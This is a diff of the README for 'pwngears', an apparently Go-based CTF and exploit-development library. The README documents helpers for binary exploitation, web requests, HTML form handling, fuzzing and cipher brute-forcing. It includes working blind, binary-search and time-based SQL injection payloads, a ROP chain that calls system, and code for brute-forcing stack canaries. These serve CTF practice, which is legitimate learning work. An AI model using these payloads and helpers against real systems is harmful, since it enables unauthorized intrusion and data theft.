@@ -22,89 +22,49 @@ Pwngears is a CTF framework and exploit development library based on pwntools. I
 - [ ] Image layer analysis
 
 ## Quick Showcase
+Everything below comes from the single root import: `import . "github.com/tonythetender/pwngears"`.
 ```go
-// --------------------------------------
-// -------- BINARY EXPLOITATION ---------
-// --------------------------------------
-p := Process("./supersecure")
-defer p.Close()
+// ---------- Binary exploitation ----------
+r := Remote("127.0.0.1", 1337)
+defer r.Close()
 
-p.SendLineAfter("Name: ", "Arthur")
-response := p.RecvLineString()
+r.SendLineAfter("Name: ", "Arthur")
+leak := U64(r.Recv(8))
+Info(fmt.Sprintf("leak: %#x", leak))
 
-exploit := NewExploit(r)
-exploit.SetConnectFunc(func() pwn.Tube {
-	conn := Connect("127.0.0.1", 12069)
-	p.SendLine("Arthur")
-	return conn
-})
-
-canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
-	resp := tube.RecvLine()
-	return Contains(resp, "Saved")
-})
-
-retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
-	resp := tube.RecvLine()
-	return Contains(resp, "Saved")
-})
-
-pieBase := retAddr - 0x1811
-winAddr := pieBase + 0x12e9
-
-payload := Pay().
+r.SendPayload(Pay().
 	PadTo(40).
-	Canary(canary).
-	Repeat("B", 8).
-	P64(winAddr).
-	SendWithSize(r).
-	Send(response)
+	P64(leak - 0x2a).
+	P64(0x401234))
 
-r.SendPayload(payload)
+key := r.RecvLineString()
 
-key := r.RecvAllString(3 * time.Second)
-
-// --------------------------------------
-// --------------- WEB ------------------
-// --------------------------------------
+// ---------- Web ----------
 conn := Conn("http://some-ctf-website.com")
 
 resp := conn.Get("/search",
 	WithParam("query", "admin"),
-	WithHeader("Content-Type", "application/json"),
 	WithCookie("admin-key", key))
 
-var pass string
-passPattern := regexp.MustCompile(`pass: (.*)`)
-for _, line := range resp.Lines() {
-	pass = pattern.FindStringSubmatch(line)[1]
-}
+pass := resp.Match(`pass: (.*)`)
 
-form := NewForm()
-form.Set("username", "admin")
-form.Set("pass", pass)
-loginResp := conn.Post("/login", form)
+login := conn.PostForm("/login", Fields{
+	"username": "admin",
+	"password": pass,
+})
+cipher := login.Match(`secret-encrypted-flag:(.*)`)
 
-encryptedflagPattern := regexp.MustCompile(`secret-encrypted-flag:(.*)\n`)
-encryptedFlag := flagPattern.FindStringSubmatch(line)[1]
-// --------------------------------------
-// ------------ CRYPTOGRAPHY ------------
-// --------------------------------------
-
+// ---------- Cryptography ----------
 engine := NewCryptoEngine()
 
-xorLower := XORCipher{
-	KeyAlphabet: []byte("abcdefghijklmnopqrstuvwxyz123456789"),
-}
-
-results := engine.BruteForce(xorLower, cypher,
+results := engine.BruteForce(XORCipher{}, []byte(cipher),
 	WithMaxKeyLength(8),
 	WithFindAllPossibleKeys(false),
 	WithPatternPrefix("PWNGEARS{"),
 	WithPatternSuffix("}"),
-
-for _, r := range results {
-	fmt.Printf("[%s] key=%q\n%s\n", r.Cipher, r.Key, r.Plaintext)
+)
+for _, res := range results {
+	fmt.Printf("[%s] key=%q\n%s\n", res.Cipher, res.Key, res.Plaintext)
 }
 ```
 
@@ -112,21 +72,24 @@ for _, r := range results {
 ```sh
 go get github.com/tonythetender/pwngears
 ```
-Pwngears uses a hierarchy of different packages detached from the core package which allows you to only import what you need for the current exploit. For example, if you're doing a web challenge you wont need functions relating to binary exploitation. As such you can decide only import whats needed for web challenges. 
-
+Everything you need for the common case is re-exported from a single root package, so most exploits only need one import.
 ```go
-import "github.com/tonythetender/pwngears/web"
+import . "github.com/tonythetender/pwngears"
 ```
-If you need to do bruteforcing, you can decide to also import the core bruteforcing package and its web components. 
+This gives you the whole dependency-free core (binary exploitation, web, cryptography and bruteforcing) under one namespace. The root package pulls in no third-party code, so an exploit built on it compiles to a lean static binary.
+
+If you prefer a more focused namespace, you can still import the individual subpackages directly.
 ```go
 import (
 	"github.com/tonythetender/pwngears/web"
 	"github.com/tonythetender/pwngears/bruteforce"
-	"github.com/tonythetender/pwngears/bruteforce/bfweb"
 )
-
 ```
-This allows for a more focused API for the user needs. This also means that if some external dependencies are added in the future, those can be plugins that the user won't need to include in their binaries if they're not being used.
+
+Features that rely on an external dependency live in their own opt-in subpackages, so they are only pulled into your binary when you actually import them. The HTML navigation package (`web/dom`) is one such example and is covered in its own section below.
+```go
+import "github.com/tonythetender/pwngears/web/dom"
+```
 ## Basic Syntax
 
 > [!NOTE]
@@ -173,15 +136,12 @@ if err != nil {
 > The example given above are with the web connection, but they all work the same way with process and remote connections, as well as other constructors like the bruteforcer. Just replace `Conn` with `Process` or `Remote`. From here on out, to keep the documentation concise, the connection with the logger will be used.
         
 ### Web
-You'll first need to import the web package.
+With the root import, the web helpers are already in scope.
 ```go
-import (
-	. "github.com/tonythetender/pwngears"
-	. "github.com/tonythetender/pwngears/web"
-)
+import . "github.com/tonythetender/pwngears"
 ```
 
-This connection will hold at users should know, even when skimming content.track of things like cookies and headers while also making sure the connection doesn't timeout or redirect indefinitely.
+The connection keeps track of things like cookies and headers while making sure it doesn't time out or follow redirects indefinitely.
 
 From there you can make GET request simply like this :
 ```go
@@ -301,10 +261,52 @@ resp.Lines()              // body split into lines
 resp.Contains("admin")    // substring check on the body
 ```
 
-### Binary exploitation
-You'll first need to import the process package.
+### DOM parsing and navigation
+The helpers above search the raw body. When you need to actually parse the HTML, select elements, follow links or round-trip a form, use the opt-in `web/dom` package. It is built on `golang.org/x/net/html`, so it lives in its own subpackage and is only compiled into your binary when you import it.
 ```go
-import . "github.com/tonythetender/pwngears/process"
+import (
+	. "github.com/tonythetender/pwngears"
+	"github.com/tonythetender/pwngears/web/dom"
+)
+```
+`dom.Fetch` requests a path through your connection and parses the result into a `Page`. From there you can select elements with a small CSS-like selector (tag, `.class`, `#id`, `[attr]`, `[attr=value]`, and descendant combinators) and read their attributes or text.
+```go
+conn := Conn("http://some-ctf-website.com")
+page := dom.Fetch(conn, "/")
+
+title := page.First("h1").Text()
+for _, a := range page.All("a[href]") {
+	fmt.Println(a.Attr("href"), "->", a.Text())
+}
+```
+Following a link reuses the same connection, so cookies and the session are kept. Relative links are resolved against the current page.
+```go
+next := page.First("a.next").Follow()   // or page.Follow("a.next")
+flag := next.Flag("FLAG")
+```
+`Form` is the most useful part for CTF. It pre-loads every field already in the form, including hidden inputs and CSRF tokens, so you only set what you want and submit. It posts to the form's resolved action with its method.
+```go
+after := page.Form("#login").
+	Set("username", "admin").
+	Set("password", "admin").
+	Submit()
+
+if after.Contains("Welcome") {
+	// logged in, with the CSRF token carried over automatically
+}
+```
+The page also exposes convenience extractors.
+```go
+page.Links()              // all hrefs, resolved to absolute URLs
+page.Attrs("img", "src")  // one attribute across every match
+page.Texts(".comment")    // inner text of every match
+page.Flag("FLAG")         // grep the page for a flag
+```
+
+### Binary exploitation
+The binary exploitation helpers come with the root import as well.
+```go
+import . "github.com/tonythetender/pwngears"
 ```
 To do binary exploitation (ie pwning and reverse) you can connect to a process either localy through an executable
 ```go
@@ -343,83 +345,117 @@ You can also send an input after the process as output a certain line
 r.SendLineAfter("Name: ", "John")
 ```
 
+#### Building payloads
+Payloads are built fluently. `Pay()` (or `Flat()`) takes any mix of parts in a single call: a `string` or `[]byte` is appended raw, and an integer is packed little-endian. Bare integers are packed as 64-bit, since addresses are the common case; use a `uint32`/`uint16`/`byte` value (or `P32`/`P16`/`P8`) when you need a narrower width.
+```go
+// padding is []byte, the rest are uint64 addresses
+Flat(padding, popRdi, binsh, ret, system)
+```
+You can also chain builders, which reads well for the classic "padding then addresses" layout. `PadTo` fills with `A` up to a length, `.Flat(...)` splices in a run of parts, and `Ret` is an alias for `P64` that documents intent.
+```go
+payload := Pay().
+	PadTo(72).
+	Flat(popRdi, binsh, ret).
+	Ret(system)
+
+r.SendPayload(payload)
+```
+> [!NOTE]
+> `Pay(...)`, `Flat(...)` and `.Flat(...)` pack a bare integer as 8 bytes. The older `.Add(...)` method still packs an `int` as 4 bytes, so prefer `Flat`/`P64`/`Ret` for 64-bit addresses to avoid silently truncating them.
+
 ## Advanced Syntax
 
-### Web
-A lot of challenge will require you to iterate over alphanumeric character in order to find the next missing character. For example, when doing SQL injection, you might get a feedback if the start of your input is correct so you need to iterate over every character until you find the whole input. Using the integrated BruteForcer makes this simple.
+### Bruteforcing and oracles
+A lot of challenges make you recover a value one character at a time: blind SQL injection, a comparison endpoint, a reset token check. The `Bruteforcer` drives the loop; an *oracle* tells it whether a guess is correct.
+
+`Oracle` turns "send a payload, then look at the response" into the yes/no test the bruteforcer expects. You decide how the payload is sent (query parameter, path, header, body) and what counts as success.
 ```go
-import (
-	. "github.com/tonythetender/pwngears/bruteforce"
-	. "github.com/tonythetender/pwngears/web"
+conn := Conn("http://some-ctf-website.com")
+
+oracle := Oracle(
+	func(guess string) *Response {
+		q := fmt.Sprintf("1 AND SUBSTRING(password,1,%d)='%s'", len(guess), guess)
+		return conn.Get("/item", WithParam("id", q))
+	},
+	func(r *Response) bool { return r.Contains("found") },
 )
 
-func BruteForceFormExample(ctf *web.WebConn) string {
-	conn := Conn("http://some-ctf-website.com")
+bf := NewBruteforcer()
+bf.Charset = GenerateCharset("lowercase", "digits")
+bf.Workers = 16 // test the charset concurrently; leave at 1 for a sequential scan
+bf.Delay = 50 * time.Millisecond
 
-	exploit := NewBruteforcer()
-	// Multiple charset options are available but you can also pass a custom
-	// string that will be used as the charset
-	exploit.Charset = GenerateCharset("alphanumeric", "special")
-	exploit.MaxLength = 24
-	exploit.Delay = 50 * time.Millisecond
+password, _ := bf.BruteforceCharByChar("", "", oracle)
+```
+`Workers` races the whole charset for each position and stops as soon as a character matches, which is a big speedup against a slow endpoint. Set it back to `1` when the target is rate limited or order sensitive.
 
-	// Different bruteforcer are available, here we use PostRequestBf
-	// for bruteforcing a form sent through a POST request
-	password := exploit.CharByChar(`admin' AND password like '`, `%' --`, PostRequestBf(
-		conn.Client,
-		"/login",
-		"username",
-		// For every attempt, the bruteforcer will make sure this field is filled
-		AlsoFillFormField("password", "Joe"),
-		// The input will be consider valid if the following two conditions are true
-		WithoutBodyContains("invalid"),
-		WithResponseCode(200),
-	))
-	return password
+### Binary search extraction
+When the oracle can answer "is the byte at this position greater than N", you can binary-search each character instead of scanning the whole charset. That is about 7 requests per character rather than one per candidate.
+
+`GreaterOracle` builds the comparison test, and `BinarySearch` drives it (positions are 1-indexed, and extraction stops when it reaches the end of the string).
+```go
+greater := GreaterOracle(
+	func(pos, value int) *Response {
+		q := fmt.Sprintf("1 AND ASCII(SUBSTRING(password,%d,1))>%d", pos, value)
+		return conn.Get("/item", WithParam("id", q))
+	},
+	func(r *Response) bool { return r.Contains("found") },
+)
+
+bf := NewBruteforcer()
+bf.MaxLength = 32
+password, _ := bf.BinarySearch(greater)
+```
+
+### Fuzzing
+For discovery (directories, parameters, subdomains) `Fuzz` runs a wordlist concurrently and keeps the responses that pass your filters. You provide a function that sends the request for a word, so the injection point is wherever you put it.
+```go
+hits := Fuzz(
+	func(word string) *Response { return conn.Get("/" + word) },
+	wordlist,
+	MatchStatus(200, 301),
+	FilterLength(1234),
+)
+for _, h := range hits {
+	fmt.Printf("%-20s status=%d len=%d\n", h.Word, h.Status, h.Length)
 }
 ```
+Filters are combined with AND. `MatchStatus`, `MatchLength` and `MatchRegex` keep a response; `FilterStatus`, `FilterLength` and `FilterRegex` discard one (handy for hiding a known "not found" page). Fuzzing runs 20 workers by default; use `Fuzzer{Workers: n}.Run(...)` to change that. Hits come back in wordlist order.
+
 ### Time-based SQLI
-Lets say your SQLI doesn't provide you with proper response telling you if your query is correct. Different database provide way to make the query take longer in the event that the query is true. Lets say youre trying to find the password of the user id 1 by sleeping when the character is correct. You can make it so that if the response takes above 3 seconds, it counts as valid.
+Sometimes the response is identical whether the guess is right or wrong, and the only signal is how long the query takes. `TimingAttack` measures each attempt and keeps a character when the request runs longer than your threshold. It stays sequential on purpose, since running attempts in parallel would add noise to the timing.
 ```go
-func BruteForceFormExample(conn *web.WebConn) string {
-	exploit := NewBruteforcer()
-	exploit.Charset = GenerateCharset("digits")
-	exploit.MaxLength = 10
+bf := NewBruteforcer()
+bf.Charset = GenerateCharset("lowercase", "digits")
 
-	prefix := `1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(`
-	suffix := `),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;`
-
-	password, _ := exploit.CharByChar(prefix, suffix, PostRequestBf(
-		conn.Client,
-		"/login",
-		"username",
-		web.WithResponseTimeAbove(3 * time.Second),
-	))
-	return password
-}
-
+password, _ := bf.TimingAttack("", func(guess string) time.Duration {
+	payload := fmt.Sprintf(
+		"1 UNION SELECT IF(SUBSTRING(password,1,%d)='%s',SLEEP(3),0) FROM users",
+		len(guess), guess)
+	start := time.Now()
+	conn.Get("/item", WithParam("id", payload))
+	return time.Since(start)
+}, 3*time.Second)
 ```
 
 ### Binary Exploitation
-Some function were added to facilitate the process of leaking a canary or and address. You can set up your exploit like this
+Some helpers automate leaking a stack canary or an address by brute-forcing one byte at a time. These helpers operate on the raw `Tube`, so open the connection with `NewRemote` (which returns a tube) rather than the logger wrapper, and give the exploit a function that reconnects and gets you back to the leak point.
+
+Each guess needs a check that tells the brute-forcer whether the byte was right. Rather than writing that closure by hand every time, the ready-made checks cover the common cases: `RecvLineContains` / `RecvContains` look for a marker in the response, while `Survives` / `Crashed` key off whether the connection stayed alive after the payload.
 ```go
+r, _ := NewRemote("127.0.0.1", 12069)
+defer r.Close()
+
 exploit := NewExploit(r)
-exploit.SetConnectFunc(func() pwn.Tube {
-	conn := Remote("127.0.0.1", 12069)
-	r.SendLine("Arthur")
-	return conn
+exploit.SetConnectFunc(func() Tube {
+	c, _ := NewRemote("127.0.0.1", 12069)
+	c.SendLine("Arthur")
+	return c
 })
 
-canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
-	resp := tube.RecvLine()
-	// The character is correct when the "Saved" line is displayed
-	return Contains(resp, "Saved")
-})
-
-retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
-	resp := tube.RecvLine()
-	return Contains(resp, "Saved")
-})
+// The byte is correct when the "Saved" line is displayed.
+canary, _ := exploit.LeakCanary(40, RecvLineContains("Saved"))
+retAddr, _ := exploit.LeakAddress(40, canary, 8, RecvLineContains("Saved"))
 
 pieBase := retAddr - 0x1811
 winAddr := pieBase + 0x12e9
@@ -428,6 +464,7 @@ Pay().
 	PadTo(40).
 	Canary(canary).
 	Repeat("B", 8).
-	P64(winAddr).
+	Ret(winAddr).
 	SendWithSize(r)
 ```
+Because every guess reconnects through `SetConnectFunc`, the leaks are brute-forced concurrently by default (8 workers), which turns a slow byte-at-a-time canary leak into a quick one. Tune it with `exploit.SetWorkers(n)`, or set it to `1` to go sequential against a rate-limited target. When the exploit runs against a local `Process` with no reconnect function, there is nothing fresh to reconnect to, so it automatically stays sequential.
